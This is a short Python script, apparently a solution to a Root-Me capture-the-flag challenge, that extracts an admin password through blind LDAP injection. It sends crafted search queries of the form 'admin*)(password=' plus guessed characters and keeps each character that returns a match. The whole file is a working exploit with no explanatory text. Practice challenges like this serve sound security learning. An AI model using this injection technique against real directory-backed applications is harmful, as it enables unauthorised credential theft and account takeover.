import requests
import string

url = 'http://challenge01.root-me.org/web-serveur/ch26/'
charlist = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

def findPass():
	password = ''
	while True:
		for i in charlist:
			r = requests.get(url+'?action=dir&search=admin*)(password='+password+i)
			if "admin" in r.text:
				password += i
				print(password)
				break
		else:
			break
	return password

def main():
	print("[+] Found admin's password: ", findPass())

if __name__=="__main__":
	main()